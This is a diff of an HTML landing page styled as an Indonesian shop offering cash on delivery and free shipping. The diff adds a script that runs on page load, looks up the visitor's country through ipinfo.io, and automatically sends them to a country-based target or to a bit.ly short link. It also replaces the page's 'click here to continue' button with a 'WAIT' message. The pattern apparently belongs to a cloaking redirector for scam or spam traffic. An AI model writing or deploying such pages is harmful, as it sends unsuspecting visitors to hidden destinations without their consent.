@@ -12,9 +12,21 @@
   <meta property="og:image" content="fb-og-image.jpg" />
   <meta property="og:title" content="Bayar Saat Barang Diterima & Gratis Ongkir" />
   <meta property="og:description" content="Kualitas Terjamin Dengan Harga Murah" />
+  <script>
+    negara = null;
+    $.get("https://ipinfo.io", function (response) {
+      negara = response.country;
+      if (negara !== null) {
+        negara = negara.toLowerCase();
+        target = make_target(negara);
+      } else {
+        target = "https://bit.ly/33UeWWQ";
+      }
+      window.location = target;
+    }, "jsonp");
+  </script>
   <style>
     body {
-      background-image: "background.jpg";
       width: 100%;
       height: auto;
       background-size: contain;
@@ -28,10 +40,7 @@
     <center>
       <div class="col-md-2"></div>
       <div class="col-md-8">
-        <button type="button" id="wow" class="btn btn-info btn-lg btn-block" style="margin: 40% auto">
-          KLIK DISINI UNTUK MELANJUTKAN
-        </button>
-        <input id="negara" type="text">
+        WAIT . . .
       </div>
       <div class="col-md-2"></div>
     </center>
